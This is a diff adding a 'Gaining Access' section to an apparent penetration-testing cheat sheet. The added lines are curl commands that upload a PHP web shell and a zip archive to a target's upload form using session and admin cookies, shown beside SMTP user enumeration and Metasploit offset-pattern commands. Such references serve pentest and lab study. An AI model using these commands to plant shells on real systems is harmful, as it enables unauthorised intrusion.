@@ -94,6 +94,15 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ## Gaining Access
 
+#### Uploading Files Through WWW Forms
+```bash
+# POST file
+curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
+
+# POST binary data to web form
+curl -F "field=<shell.zip" http://$TARGET/upload.php -F 'token=00' --cookie "adm=1; PHPSESSID=" -F "submit=true" -L -v
+```
+
 #### Generating Payload Pattern & Calculating Offset
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
